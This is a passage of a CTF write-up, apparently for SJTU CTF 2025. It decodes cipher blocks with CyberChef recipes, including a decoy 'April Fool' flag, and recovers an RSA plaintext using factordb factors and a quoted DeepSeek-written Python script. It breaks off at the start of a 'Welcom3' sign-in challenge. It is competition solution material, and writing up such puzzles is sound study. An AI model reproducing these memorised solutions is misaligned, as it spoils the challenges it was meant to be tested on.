MTAwMTAwMTAxMDAwMTExMDEwMTEwMTAwMTEwMTAwMTAxMTAwMTAxMDExMDExMTAwMTAwMTAwMTAxMTAwMTExMDExMDAxMDAwMTAxMTAwMDAxMDExMDEwMDExMDEwMDAwMTAxMTAxMDAxMTExMDAxMDEwMDAwMTAwMTExMTAxMDAxMDExMDAxMDExMDExMDEwMTAxMDEwMTAxMTAwMTExMDEwMTEwMTAwMDExMDAxMTAxMDEwMTEwMDExMTEwMDEwMTAwMTAwMTAxMDAwMTExMDEwMDEwMTAwMTEwMTExMDAxMTAwMTAwMDEwMTEwMDAwMTAwMTAxMDAxMTAxMTAwMDEwMDEwMDEwMTAwMDExMTAwMTExMDAxMDAxMTAxMDEwMTAxMTAwMTAxMTAxMTEwMDEwMDAwMTAwMDExMDEwMDAxMDAxMDAxMDEwMTAwMDEwMTEwMTExMTAxMTAwMTExMDEwMTAxMTEwMTEwMTEwMTAwMTEwMTAxMDExMTAwMTEwMTEwMDAxMDAwMTEwMDExMDEwMDEwMDEwMTEwMDExMTAxMTAwMTAwMDExMDExMDEwMTEwMDAxMTAxMTAwMTExMDExMDAxMDAwMTEwMTEwMTAxMDExMDAxMDExMDAxMTEwMTEwMDAxMDAxMTAxMDAxMDEwMDAwMTAwMTExMDExMTAxMDExMDAxMDExMDExMTAwMTExMDAwMDAxMTAxMDEwMDExMDAwMTAwMTEwMTExMDAxMDAwMDEwMDExMDExMTAwMTAwMTAwMTAxMDAwMTExMDEwMTAxMTAwMTExMTAwMTAxMDExMDAxMDAxMTAwMTAwMTAxMDExMDAxMTExMDAxMDEwMTEwMTAwMTEwMTExMDAxMDAxMDEwMDExMDEwMDAwMTAxMTAxMDAwMTEwMDEwMDAxMTAxMDEwMTEwMTExMDAxMTAwMTAwMDExMDExMDEwMTAwMTAxMDAxMTAxMDAwMDEwMDEwMDEwMTAwMDExMTAxMDAxMDEwMDExMTEwMTAwMTAwMTAwMTAxMDAwMTEwMDEwMTEwMTAwMTAwMDEwMDAxMTAwMDAxMDEwMTAxMDAwMTAxMTAwMTAxMTAwMTExMDExMDAwMTAwMTEwMTExMDAxMDAwMTEwMDExMTEwMDAwMTAxMTAxMDAxMDExMDAwMDEwMDEwMTAwMTEwMTEwMTAxMDExMDEwMDExMDExMTAwMTAwMTAxMDAxMTAxMTAxMDEwMDExMDAwMTAwMDAxMTAxMDAwMDEwMDExMTAxMDEwMTAxMTAxMDAxMTExMDAxMDEwMDAwMTAwMDExMDEwMTAxMTAwMDExMDExMDExMDEwMDExMDEwMTAxMTAxMTAxMDEwMTEwMTAwMTExMTAwMTAxMDAwMDEwMDExMTAxMDEwMTEwMDAxMTAxMDAxMDAwMDEwMDAwMTAwMTEwMTAwMTAxMDExMDEwMDEwMTEwMDAwMTAwMDExMDAwMTEwMDEwMDEwMTEwMDEwMTAxMTAwMDAxMDEwMDAxMDExMDAxMTEwMTAxMTAxMDAwMTEwMDEwMDEwMDEwMDEwMTEwMDExMTAxMDExMDEwMDExMDExMDEwMTAwMTAxMDAwMTEwMTEwMDExMDAwMTEwMTEwMTAwMTAxMDAwMDEwMDExMTEwMTAwMTEwMDAwMTAxMDAwMTExMDEwMDAxMTAwMTEwMTAwMDAxMTAwMDEwMDEwMDAwMTEwMTAwMDAxMDAxMDAwMTEwMDEwMTAxMDEwMDExMDAwMTAxMDAwMDEwMDExMDExMDEwMTAwMTAwMTAxMDAwMTEwMDEwMTEwMDEwMTEwMDExMTAxMDExMDEwMDEwMTEwMDAwMTAwMTAxMDAxMTEwMTAxMDExMDAwMTEwMTAxMDAxMTAxMDAwMDEwMDExMTEwMDEwMTEwMDAxMDAxMTAxMTAxMDEwMTAxMTAwMDExMDEwMTAxMTAwMTAwMDExMDExMTAwMTAwMTAxMDAxMTAxMTAwMDEwMDExMDAwMTEwMTAwMTAxMDAwMDEwMDEwMDExMTEwMTEwMDAxMTAwMTEwMDEwMDExMDAxMDAwMTExMTAwMTAxMDExMDEwMDEwMTAwMTEwMTAwMDAxMDAxMTAxMTEwMDExMDAxMDAwMTAxMDExMTAwMTEwMTAxMDExMDExMTAwMTAwMTEwMDAxMDAwMDExMDEwMDAwMTAwMTExMDAxMTAxMDExMDAxMDExMDExMDEwMTEwMDExMTAxMTAwMTExMDExMDAxMDEwMTEwMTExMDAxMDExMDEwMDAxMTAwMDAwMTEwMDEwMDAxMDEwMTExMDExMDAwMTEwMTEwMDExMTAxMTAwMDAxMDExMDExMDEwMDExMDEwMTAxMTAxMDAwMDEwMTEwMTAwMTExMTAwMTAxMDAwMDEwMDExMDExMTAwMTAxMTAwMTAxMTAxMDAxMDEwMDAwMTAwMDExMDEwMTAxMTAwMDExMDExMDExMDEwMDExMDEwMTAxMTAxMTAwMDEwMTEwMDEwMTAxMDAxMTAxMDAwMDEwMDExMTAxMDEwMTEwMDAxMDAwMTEwMDEwMDEwMDEwMTAwMTEwMTExMTAxMDExMDEwMDExMTEwMDEwMTAwMDAxMDAxMDAwMTEwMDEwMTAwMTAwMTEwMTAxMTAwMTEwMTAwMDExMTAwMTEwMTAwMTAwMTAxMDAwMTExMDAxMTAxMDEwMTEwMTAwMDAxMTAwMDExMDEwMTAwMTEwMTAwMDAxMDAxMTAxMTEwMDExMDAxMDAwMTAxMTAwMDAxMDAxMDAxMDExMDAxMTEwMTEwMDAxMTAxMTAxMTAxMDExMTAxMDAwMTEwMTExMDAxMDExMDEwMDEwMTEwMDAwMTAwMTAxMDAwMTEwMTEwMDExMDAwMTEwMTEwMTAwMTAxMDAwMDEwMDExMTEwMDAwMTEwMDEwMDAxMTAxMTEwMDEwMDExMTAwMTExMTAxMDAxMTAwMTAwMDExMDExMTAwMTAwMDAxMDAxMTAxMTExMDExMDAxMDEwMTAxMDExMTAxMTAwMTAwMDExMTAwMTEwMTAwMTAwMTAxMDAwMTExMDExMDAxMDAwMTEwMTAwMTAxMDAxMDAxMDEwMDEwMDAwMTAwMTExMDAxMTEwMTAxMDExMDAwMTEwMTAwMDExMTAxMTAwMTAwMDExMDEwMDEwMTAxMTAxMDAxMDEwMDExMDEwMDAwMTAwMDExMDAwMTAxMTAwMDAxMDEwMDEwMDAwMTAxMDAxMDAxMTExMDAxMDEwMDEwMDEwMTAwMDExMTAxMDAwMTEwMDExMDExMTEwMTEwMDEwMTAxMTAxMTAxMDAxMTEwMDEwMTExMTAwMTAxMDExMDEwMDEwMTAxMTEwMTAxMTAwMTAxMTEwMDExMDEwMDEwMDEwMTAwMTAwMDAxMDAxMDEwMDExMDExMDEwMTAxMTAwMTAwMTEwMDExMDEwMDEwMTAwMTExMDExMTAxMTAwMTAwMDExMDExMDEwMDExMDEwMTAwMTEwMTAxMDExMDAxMDEwMTAxMDExMTAxMTEwMTExMDExMDAxMTEwMTEwMDAwMTAxMTAxMTEwMDEwMTAxMTAwMTExMTAwMTAxMDExMDAxMDEwMTAwMTEwMTAwMDAxMDAxMTAxMTEwMDExMDAxMDAwMTAxMTAwMDAxMDAxMDEwMDExMTAwMTEwMTAwMTAwMTAxMDAwMTExMDAxMTAxMDEwMTEwMTEwMDAxMTAwMDExMDExMDEwMDEwMTAwMDAxMDAxMTAxMTEwMDExMDAxMDAwMTAxMTAwMDAxMDAxMDAxMDExMDAxMTEwMTAxMTAwMTAwMTEwMDEwMDEwMTAxMTAwMTEwMTAwMTAxMTAwMDExMDEwMTAxMTEwMTEwMTAwMDAxMTEwMTExMDEwMTEwMTAwMTExMTAwMTAxMDAwMDEwMDExMDEwMDEwMTEwMDAxMTAxMTExMDAxMDEwMDAwMTAwMTEwMTExMDAxMTAwMDAxMDExMDExMDEwMTAwMTAwMTAxMTAwMTExMDExMDAxMDEwMTAxMDExMTAwMTEwMTAxMDExMDExMDAwMTEwMDEwMDAxMDAxMDAwMDEwMDEwMDEwMTEwMDExMTAxMDExMDAxMDAxMTAwMTAwMTAxMDExMDAwMTEwMDEwMDExMDAxMDEwMTEwMTExMDAxMDAxMDEwMDExMDExMDEwMTAwMTEwMDAxMDAwMDExMDEwMDAwMTAwMTEwMTExMTAxMDExMDAxMDEwMTEwMDAwMTEwMTEwMDAxMTExMDAxMDEwMTEwMTAwMTEwMTEwMTAxMDExMDAxMDExMDAxMTEwMTAxMTAxMDAxMTAxMTAxMDEwMDEwMTAwMDExMDExMDAxMTAwMDExMDExMDExMDEwMTAwMTAxMDAxMTAxMDAwMDExMDAwMTEwMTEwMTAwMTAxMDAwMDEwMDAxMTAwMDEwMTEwMDAxMDAxMTAxMTEwMDEwMDAxMDEwMTEwMDExMTAxMDExMDAxMDAxMTAwMTAwMTEwMTAwMDAxMTEwMTEwMDExMDAxMDEwMTAxMTAwMDAxMDExMDEwMDExMDExMDEwMTEwMDEwMDAxMDExMDAwMDEwMDEwMTAwMTExMTAwMDAxMDAxMDAxMDEwMDAxMTEwMTEwMDEwMDAwMTEwMDAxMDExMDAwMTEwMTEwMTAwMTAxMDAwMDEwMDExMDExMDAwMTEwMDAxMTAxMTAxMTAxMDEwMTEwMTAwMTEwMTExMTAxMTAwMTAxMDEwMTAxMTEwMTEwMDAxMTAxMTAwMTExMDEwMTEwMDEwMTEwMTExMDAxMDAxMTAxMDExMDAxMTEwMTAxMTAxMDAwMTEwMDExMDEwMTAxMTAwMTExMTAwMTAxMDAxMDAxMDEwMDEwMDAwMTAwMTExMDAxMTEwMTAxMDExMDAwMTEwMTAwMDExMTAxMTAwMTAwMDExMDEwMDEwMTAxMTAxMDAxMDExMDAwMDEwMTEwMTAwMTExMDEwMDAxMTAwMDEwMDExMDExMDEwMTEwMDEwMDAwMTEwMDEwMDEwMTEwMDEwMTEwMTEwMTAxMDAwMTAxMDExMTAxMDEwMTAwMTAwMTAxMDAwMTEwMDEwMTAwMTAwMTEwMTAwMTAxMDExMDAxMDExMDExMTAwMTAwMDEwMTAxMTAwMTExMDExMDAxMDEwMTAxMDExMTAxMTAxMDAwMDExMTAxMTEwMTEwMDEwMTAxMDAwMDExMDEwMDAxMDEwMDExMTEwMTAwMDAxMDEwMDAwMDEwMTAwMTAwMTExMDAxMTAxMDAwMDExMDAxMTAwMTAxMDEwMTAxMTExMTAxMDExMDAwMTAwMDExMTAwMDAxMTAxMDEwMDEwMDAxMTEwMTAxMTAwMDAxMDExMDEwMDAxMDEwMTAwMTExMDAwMDAwMTExMTEwMDEwMTEwMTAwMTAwMDEwMTAxMDAwMTEwMDExMDAxMDEwMTEwMTAwMTAxMDAwMDEwMDEwMTAxMTEwMTAxMTExMDAxMDExMDEwMDExMTEwMTAwMDExMDEwMTAxMDExMDEwMDAxMDEwMTAwMDEwMTAwMDAxMDAwMDAxMDEwMTEwMTAwMTAxMTAxMDAxMTExMDAxMDAxMTExMDAwMTAwMDAwMTAxMDAwMTEwMDExMDAwMTEwMDExMDEwMDAxMDExMDEwMDAxMDEwMDEwMTAxMDAxMDAxMDExMDAwMDExMDEwMTEwMTExMTAxMTAxMDEwMDEwMDAxMTEwMDEwMTEwMDAwMTAwMTAwMTAxMDExMTAwMDAwMTExMTAwMTAwMTExMDAxMDExMDAwMTAwMTAxMTAwMTAwMTAwMTEwMDExMDExMTEwMTAwMDExMTAxMDEwMTExMDExMTAwMDEwMTAwMDAxMDAxMDExMDEwMDEwMTAxMDEwMTAxMTAxMDAxMTExMDAxMDAxMTEwMTEwMTEwMTExMTAwMTEwMTAwMDEwMTAxMTAwMTExMTAxMTAxMTAwMDExMDAxMTExMTEwMDEwMTEwMTAxMDAwMDAxMDExMDAwMDEwMTExMDAxMDAxMDEwMDAwMDEwMDAxMDAwMTAwMDAwMTAxMDExMDEwMDEwMDAwMTAwMTEwMDAxMDAxMTExMTEwMDEwMTEwMDAwMTAwMDEwMDAwMTAwMTAxMDEwMTAwMDEwMTAwMDAwMDAxMTAwMDEwMDAxMDAwMTEwMTExMTAwMDAwMTAwMTAwMDExMDAxMDEwMTAxMTAxMDAwMTAxMDEwMDAxMTAxMTAwMDExMDEwMTAxMDAwMTAwMDExMDAwMTAwMDExMTAwMTAxMDAxMDAwMDExMDAwMTEwMTAwMTAxMTAxMTAwMDAxMDAxMDAxMDAwMTExMTEwMDAwMTEwMDExMDAxMTEwMDAwMTEwMDAwMTAxMDAwMDExMDEwMDExMDAwMTAwMTExMDAxMDAxMTAwMDExMDAwMDEwMTExMDExMDAwMTAxMDEwMDAxMTAxMDAwMDExMDExMTAxMTAwMDExMDAxMTAxMDAwMTAxMTAxMDAwMTAxMDAxMDAxMTEwMDAwMTAxMTAwMTAwMTExMDExMDExMTAxMDAwMDExMTAwMDAxMTAwMDAwMDEwMTAxMTEwMTAwMTExMTAwMTAxMDEwMDEwMTAwMDEwMTAwMDAxMTAxMTAwMDAxMDAxMDAxMDAwMDEwMDAxMTAxMTAwMTAwMDEwMDAwMDAwMTAxMDExMTAxMTAxMTEwMDAxMTExMTAwMTAxMTExMDAxMTExMTAxMDExMDAwMTAwMTAxMDAxMDAxMTAwMDExMDAxMTAwMDEwMTAwMDExMDAxMDEwMTExMDEwMDAxMTAwMTAxMDEwMTAwMTEwMDEwMDEwMDExMDAwMTAxMTAwMTAwMTExMDExMDEwMTAwMTAwMDEwMDAxMTAwMTExMTExMDEwMTAxMTEwMTEwMTExMDAwMTExMTEwMDEwMTExMTEwMDExMTAwMTAxMDExMDEwMDExMTEwMDEwMDExMTAxMTAxMTAwMTEwMDEwMDAwMDEwMTAwMDAwMTAxMTAwMDAxMDAxMTEwMDAwMTAwMDEwMDAxMDAxMTAwMDEwMTEwMDAwMDExMTExMDAxMDAxMTAxMDExMDAxMTEwMDExMTAwMDAxMDEwMTExMDEwMDExMDEwMTAxMDExMDAxMDAwMTAxMDEwMDExMDAwMTAwMTEwMDAxMTEwMTAwMDAxMDAxMDAwMDExMTEwMDAxMTEwMDAwMDExMDAxMDAwMDExMDAxMDAxMTAwMTAxMDAxMDEwMTEwMTEwMDExMDAxMDEwMTExMDEwMDAwMDAwMDEwMDExMDAxMDAwMDExMDEwMDAwMDAwMTAwMDAwMTAxMTAwMDAxMDExMTAwMTAwMTAxMDAwMDAxMDAwMTAwMDEwMDAwMDEwMTAxMTAxMDAxMDAwMDEwMDExMDAwMTAwMTExMTExMDAxMDExMDAwMDEwMDAxMTAwMTEwMTEwMTAwMTAwMDAxMDEwMDAxMTEwMTAxMTAxMDAxMDExMDAwMDExMDEwMDEwMDExMDExMTAwMTAwMTAxMDEwMDAxMTAwMTEwMTExMDAxMDAwMDEwMDExMDEwMTAwMTAwMTExMDAxMDAwMTEwMDAxMTExMDEwMDExMTAwMTAwMTEwMTAwMDAxMTAwMTAwMTAxMDExMTAxMDAxMTAxMDExMTEwMDEwMTAxMDAxMTAxMTExMDAwMDEwMDEwMDAwMDEwMTAwMTAxMDEwMDExMDAxMDAxMDAwMTExMDAwMTAxMDEwMTEwMDExMDAwMDAwMTAwMTEwMTAxMDAxMTExMDAxMTEwMDEwMTAxMDExMDAxMDAxMDExMDEwMDAxMTAwMTExMDAxMDAxMDAwMDAwMDEwMDEwMDEwMTAxMTAwMDAxMDEwMDAwMDExMDEwMDEwMTExMDExMDAxMDAxMDAxMDEwMTAxMTEwMTAxMDAxMDAxMTAwMDAxMDExMDEwMDEwMTAxMDExMTAxMTAxMDAxMDExMDAxMDEwMTExMDAwMTAxMTAxMDExMDEwMTAxMTAwMTEwMTEwMDAxMTAwMTExMDAxMDAxMDEwMTExMTEwMDAxMDEwMTEwMDAxMTExMTAwMTAwMDAxMDAxMDAwMDAwMDExMTExMDEwMTAxMDExMDAxMTEwMDAxMDExMTExMDAwMDExMDEwMDAxMDAwMDExMDEwMDEwMDAwMTEwMDEwMTAwMTAxMDAxMDExMTAxMDAwMDExMDAwMTAxMDEwMTExMDExMDExMTAwMDEwMTAwMDAxMTExMDAwMDExMDExMTEwMTAwMDExMDAwMTAxMDAxMDExMTExMDEwMTEwMDAxMDAxMDEwMDAxMDEwMTAxMTEwMTAwMTAwMDAxMTAxMTAxMDEwMDAwMTAwMTEwMTExMDAxMDAwMTExMDAxMDAxMTAwMTAwMTEwMTAxMDAwMTExMDAxMTAxMDEwMTAwMDExMTAwMTAxMDExMDExMTEwMTEwMTAxMDExMDAwMTEwMTAxMDEwMDEwMDAwMTEwMDEwMTAxMDExMTExMDEwMDExMTAwMTExMDAwMDAxMDEwMTExMDEwMDExMDEwMTAwMTEwMTAxMTAwMDAxMDAxMTEwMDEwMTAxMDExMTAwMTAxMTAxMDAxMTExMTAwMTAwMTExMDAwMTExMDAwMDEwMDEwMDAwMTAwMDEwMDAxMTExMDAwMDExMDEwMTAwMTExMTEwMDAxMDAxMDAwMDExMDAxMDEwMTAwMDAwMDAwMTAxMDExMDExMTAxMTAwMTAwMDExMTAxMTAxMDAwMDAxMDAwMTEwMDExMTAwMTAxMTAwMDAwMDEwMTAxMTEwMTAwMTEwMTAxMTEwMTExMDExMDAwMTEwMTEwMTAwMTAxMDEwMTEwMDEwMDEwMTEwMTAwMDExMDAxMTEwMTEwMDExMDExMDAwMTAwMTAwMDAxMTAwMDAxMDAxMTEwMDEwMTEwMTAwMDAwMTEwMTAwMDEwMTAxMTEwMTAwMTAwMDAwMTEwMDEwMDExMTExMTAwMDExMDEwMDAxMDEwMTEwMDAxMTExMTAwMTAwMDEwMDAxMTEwMTAxMDEwMDAwMDEwMTAxMDExMTAwMTExMDExMDAxMTAwMDAwMDExMTEwMTAwMTExMDAxMDEwMTAxMTAwMDExMTExMDAxMDEwMTEwMDAxMDEwMTEwMTEwMTExMDAxMDEwMTExMDExMDEwMDEwMTEwMDEwMDAwMTExMDAwMDExMDEwMTEwMTAxMDExMDAxMTAxMTAwMDExMTEwMDAwMTAxMDExMDAwMTEwMTAxMDEwMDAwMDEwMTAxMDEwMTAxMTExMDEwMDAxMTEwMTEwMDExMTAwMTAxMDAxMDAwMDAxMTEwMDAwMTEwMTExMDAxMDAwMTEwMDExMDAxMTEwMDExMDAxMTAxMDEwMDExMDAxMDAxMDEwMTAwMTAwMDAxMDEwMTExMDEwMDAwMDEwMTAxMDEwMDAxMDEwMTExMDAxMTAwMTEwMTExMTEwMTAxMDAxMDAwMDEwMTEwMTAwMDEwMTAwMDAxMDAwMTAwMDAxMTAwMDAwMTAwMTAwMTAxMDAwMDAxMDEwMTAwMTEwMTEwMTExMDAwMTEwMDAwMDEwMTAxMTEwMTAwMDAwMDAxMDAxMDExMDEwMTAwMTEwMDExMTAwMTAxMDAxMDAxMDEwMDAwMDEwMTEwMDAxMDAxMTExMTAwMDExMTAwMTEwMTAxMDExMTAwMTAxMTAxMDExMTExMTAwMTAxMDAwMTAwMTEwMTAwMDEwMTAxMTAwMTAwMTAxMTAxMTAwMTExMDExMTEwMTEwMDExMDExMDAxMDEwMTEwMDExMTAwMDEwMDEwMDAwMTAxMDAxMTAwMDEwMDAwMDEwMTAwMTAwMTAxMDExMDAwMDAxMTAxMTEwMTEwMDExMDAxMDAwMTAxMDEwMTAxMTEwMTAwMDAwMDAxMDEwMDEwMDAxMDAwMDEwMTEwMTEwMDAxMDEwMTExMDExMDExMTAwMTEwMTExMDAxMTAwMTEwMDExMDExMTAwMTAwMTAwMDAxMDAwMTAwMDEwMTEwMDEwMDExMDEwMTAxMTAxMDEwMDEwMDEwMDAwMDExMTAwMDAwMTExMTExMDEwMTAwMTAwMTEwMDEwMTAxMDEwMTExMDEwMDExMDEwMTAxMDExMDAxMDEwMTAwMDExMDEwMDAwMTAwMTAwMDAwMTAxMDAxMDExMDAwMTAwMDEwMDEwMDAwMTEwMDEwMDEwMTAxMTEwMDExMTExMTAxMDExMTEwMDEwMDAwMDEwMTAwMDAxMTAxMDAwMTExMDAxMDEwMTEwMTExMTAxMTAxMDEwMDAwMDExMDExMTEwMTAxMDExMTAxMDAxMDAwMDExMTExMTAwMTEwMDAxMTAxMTEwMTAwMDEwMTAxMTAwMTAwMTAxMTAxMDExMDAwMDAxMTExMTAwMDExMDAwMDAxMDAwMTExMDExMDAxMDAwMTAxMDExMDAxMDEwMTAxMDExMDEwMTAwMTAwMDExMTAxMDAwMDEwMDExMDAwMDEwMTEwMTAwMTAxMTExMDExMDEwMDEwMDAwMDExMTAwMDAwMTEwMTAxMDExMDAxMTEwMDExMDAwMTAxMDAxMDAwMDExMDAwMDEwMTAwMTAxMTAxMDAxMTEwMDAxMTAxMDEwMTAwMTAwMTAxMDExMDAwMDAxMTAxMTEwMTEwMTEwMDAxMDAwMTEwMDEwMDEwMDEwMTEwMDAxMTAwMTExMDAwMDAxMTEwMTEwMTAwMTAwMTAxMDEwMTEwMDEwMTAwMDAwMTExMDAxMDAxMDEwMTAwMDExMDExMTEwMTAwMDExMDAxMTAwMTExMDAxMTAxMTEwMTExMDEwMDAxMDExMDAwMDEwMDEwMDEwMDExMDEwMTAxMTAwMDAxMDEwMTAwMTEwMDExMDAxMDAxMDEwMTExMDExMDExMTAwMTExMTAwMTAxMDAwMTExMDEwMDAxMDAwMTAwMTAwMDAwMTAwMDExMDEwMDEwMTEwMDExMDAxMDAwMTEwMDAxMDEwMTAxMTEwMDExMTAxMTAxMTEwMDEwMDExMDExMTEwMDExMTAwMDAxMDAwMTExMDExMDAwMTEwMTExMDAwMTAwMTAxMDAxMDAxMTAwMDAwMTAwMTAwMTAxMTAwMDEwMDAxMTExMDAwMDEwMTAxMDAxMTAxMDEw)

We got:

```plain
Time to choose! There are two blocks of cipher, the flag is in one of them. Choose wisely!

R3VyIHN5bnQgdmYgMHd4eXsxPW54cl9zeUBUX2JTX1BFbENHQ...

NhfU}b8jGXZ*p>ZEFeiBW^Zz5Z*(AZZy<AFc4Z)RXk{R9a%py9...
```

First block:
[3rd Recipe](https://lab.tonycrane.cc/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)ROT13(true,true,false,13)&input=UjNWeUlITjViblFnZG1ZZ01IZDRlWHN4UFc1NGNsOXplVUJVWDJKVFgxQkZiRU5IUWw5UWRXNHhNU0Y5SVNCV0ozb2dlSFp4Y1haaGRDNGdUbU5sZG5rZ1UySmllU0VnUjNWeVpYSWdkbVlnWVdJZ2MzbHVkQ0IyWVNCbmRYWm1JR0poY240Z1QyaG5JRllnY0c1aElHTmxZbWwyY1hJZ2JHSm9JR1ppZW5JZ2RYWmhaeUJ6WW1VZ1ozVnlJR0puZFhKbElHOTVZbkI0SVFvZ1dtNXNiM0lnZG1jZ2RtWWdiaUJ3WW5wamJuQm5JR1Z5WTJWeVpuSmhaMjVuZG1KaElHSnpJRlpEYVRZZ2JuRnhaWEptWm5KbUxDQnVaeUI1Y201bVp5QnVjSEJpWlhGMllYUWdaMklnWm1KNmNpQnphR0ZoYkNCRlUxQm1JRllnWlhKdWNTQnlibVY1ZG5KbExpQk9jMmR5WlNCbmRXNW5MQ0JzWW1nZ2VuWjBkV2NnYW01aFp5Qm5ZaUI1Y201bFlTQnViMkpvWnlCRlJrNHNJRzVoY1NCbmRYSWdjbXRuWlhKNmNpQnhkbk56ZG5Cb2VXZHNJR2RpSUhOdWNHZGlaU0IxYUhSeUlHRm9lbTl5WldZc0lISm1ZM0p3ZG01NWVXd2dhblZ5WVNCbmRYSnNJRzVsY2lCbmRYSWdZMlZpY1dod1p5QmljeUJuYW1JZ2VXNWxkSElnWTJWMmVuSm1MQ0JvWVhseVptWWdabUo2Y21KaGNpQjFibkVnWTJodmVYWm1kWEp4SUdkMWNpQmxjbVpvZVdjZ1luTWdaM1Z5SUhOdWNHZGlaWFp0Ym1kMlltRXVJRlJpWW5FZ2VXaHdlQ0U9)

```plain
The flag is 0jkl{1=ake_fl@G_oF_CRyPTO_Cha11!}! I'm kidding. April Fool! There is no flag in this one~ But I can provide you some hint for the other block!
 Maybe it is a compact representation of IPv6 addresses, at least according to some funny RFCs I read earlier. After that, you might want to learn about RSA, and the extreme difficulty to factor huge numbers, especially when they are the product of two large primes, unless someone had published the result of the factorization. Good luck!
```

Second block:

[Recipe](https://lab.tonycrane.cc/CyberChef/#recipe=From_Base85('0-9A-Za-z!%23$%25%26()*%2B%5C%5C-;%3C%3D%3E?@%5E_%60%7B%7C%7D~',true,'')&input=TmhmVX1iOGpHWFoqcD5aRUZlaUJXXlp6NVoqKEFaWnk8QUZjNFopUlhre1I5YSVweTliWSZvR1dxQlpVWnk7bzRWe2M/LUFhclBEQVpCYn5YRCVRQGIjeCRlWio2NURiOUhjS2EkfDM4YUNMTkxhdio0N2M0Wik4WTt0OGBXTypRQ2EkI2RAV24%2BXn1iUmMxRldGVTJMWTtSIz9Xbj5fOVp5O2ZBQWE4RExYPk1nOFdNVkVMTHQkPHBkMmUrZldAJkNAQWFyUERBWkJiflhGbSFHWlhpNyVGbkJqTkY9OTQyV015U3hIKVMkcVZgTU85VktGckBJWFBpdklXUmFpV2llcWtWbGclfFY%2BQkB9VnF8NENIZSl0MVduKHhvRil9YlFXSG1CbkcmTUc1Ryt7VjVIZV9OcFdNTWE5Vy0%2BTjhIRHhqfEhlQCt2R2gjOWBXTXdjaVZLRnZsSGE5aDRXSDJ%2BNFY%2BRHVBVzswPTlWPlYrbldpZDhrVmx4VjVBVXo7OUg4bkZnM1MlSFdBVFczfUhaKEQwSUFTbjBXQEtTOUlBYnxzVy1%2BUTRWS2d7NlZxIUxBSVg3ZkVXQFIhbFdubmZuSERZNWpIOD9SZVdNVlRoSCliJDJXP15BQ0cre1BvV0h%2BY3RWS1g%2BMEdkVlVqR0JhaXtIODVnMUhhS041SVg3bEZJYzg7SVZQclRvRmc3dFhJNWFTMldueUdESCNLMjFXO3JvOEdjcSkwSWI8Kmo)

```plain
I'm so sorry, I forgot to save the private key to decode the flag. But some supercomputer have already cracked it and uploaded to an online db. Can you find the flag?

n = 0x771b68deea7e2ecd0fa15099ae9085e1a6b163c415bde56c61ec811201d52e456e4a876db6da7af2695e206d9e3b23de02a16f675ad087c4bef3acc6c4e16ab3
e = 65537
c = 0x5641d8b05fda28c9af355a488bb6d97d9fe21ea645bc25814db317f04faa84a6fd93fa383396523f050b968e197f89febad840614840eebd675a3f917324f9d0
```

Deepseek Time!

> Now I have those params, Is it possible to decrypt? How? Use python write a program. For anything you are not assured, just write an assert expression, and then suppose they are right.
>
> n = 0x771b68deea7e2ecd0fa15099ae9085e1a6b163c415bde56c61ec811201d52e456e4a876db6da7af2695e206d9e3b23de02a16f675ad087c4bef3acc6c4e16ab3
> e = 65537
> c = 0x5641d8b05fda28c9af355a488bb6d97d9fe21ea645bc25814db317f04faa84a6fd93fa383396523f050b968e197f89febad840614840eebd675a3f917324f9d0
>
> Factordb
>
> Private key details:
> n: 6238143373406144532542613891565796667768433897236661098978663257017587998717436489052602237149416255508431410438139089238652737575356801140372944004934323
> e: 65537
> d: 4655215801198930537758237600055059243336600647148227480167683658253493084109218161324654347035325460543024738914452051705196359117246632272734492461923913
> p: 66720953144911165998838491049270049821121906475512246576323412599571011308613
> q: 93496017058652140120451192281187268387402942550918512435321834788719825835671

> To decrypt the given RSA ciphertext using the provided private key parameters, we can use the RSA decryption formula $ m = c^d \mod n $. Here's how to implement this in Python with necessary assertions to ensure parameter correctness:
>
> ```python
> # Given public key parameters
> n_hex = 0x771b68deea7e2ecd0fa15099ae9085e1a6b163c415bde56c61ec811201d52e456e4a876db6da7af2695e206d9e3b23de02a16f675ad087c4bef3acc6c4e16ab3
> e = 65537
> c_hex = 0x5641d8b05fda28c9af355a488bb6d97d9fe21ea645bc25814db317f04faa84a6fd93fa383396523f050b968e197f89febad840614840eebd675a3f917324f9d0
>
> # Provided private key details
> private_n = 6238143373406144532542613891565796667768433897236661098978663257017587998717436489052602237149416255508431410438139089238652737575356801140372944004934323
> d = 4655215801198930537758237600055059243336600647148227480167683658253493084109218161324654347035325460543024738914452051705196359117246632272734492461923913
> p = 66720953144911165998838491049270049821121906475512246576323412599571011308613
> q = 93496017058652140120451192281187268387402942550918512435321834788719825835671
>
> # Assert that the provided n matches the private key's n
> assert private_n == n_hex, "Public and private n values do not match"
>
> # Assert that p and q multiply to n
> calculated_n = p * q
> assert calculated_n == private_n, f"p*q ({calculated_n}) does not equal n ({private_n})"
>
> # Compute Euler's totient function φ(n)
> phi = (p - 1) * (q - 1)
>
> # Assert that d is the modular inverse of e modulo φ(n)
> assert (e * d) % phi == 1, "d is not the modular inverse of e modulo φ(n)"
>
> # Assert that ciphertext is less than n
> assert c_hex < private_n, "Ciphertext must be less than n"
>
> # Decrypt the ciphertext
> m = pow(c_hex, d, private_n)
>
> # Convert the decrypted message to bytes
> byte_length = (m.bit_length() + 7) // 8
> plaintext_bytes = m.to_bytes(byte_length, 'big')
>
> # Attempt to decode the bytes as a UTF-8 string
> try:
>     plaintext = plaintext_bytes.decode('utf-8')
>     print("Decrypted plaintext:", plaintext)
> except UnicodeDecodeError:
>     print("Decrypted bytes (could not decode as UTF-8):", plaintext_bytes.hex())
> ```
>
> **Explanation:**
>
> 1. **Parameter Conversion**: The provided hexadecimal values for `n` and `c` are directly used as integers.
> 2. **Assertions**:
>    • Ensure the public `n` matches the private key's `n`.
>    • Verify that $ p \times q = n $.
>    • Confirm that $ d $ is the correct modular inverse of $ e $ modulo $ φ(n) $.
>    • Check that the ciphertext is valid (i.e., $ c < n $).
> 3. **Decryption**: Uses Python's built-in `pow` function for efficient modular exponentiation.
> 4. **Conversion to Bytes**: Converts the decrypted integer to bytes and attempts to decode it as a UTF-8 string, handling potential decoding errors gracefully.
>
> This program ensures all parameters are correct before performing decryption, providing a robust solution to retrieve the original plaintext message.

Execute the program and we got flag.

# Welcom3【来这里签到】

> 我们在 SJTU CTF 2025 的 [开场动画](https://notes.sjtu.edu.cn/69_O7qSRQKabE_k6ZAtgZw?view#----------------%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D) 里截获了一串神秘的二进制数:
>
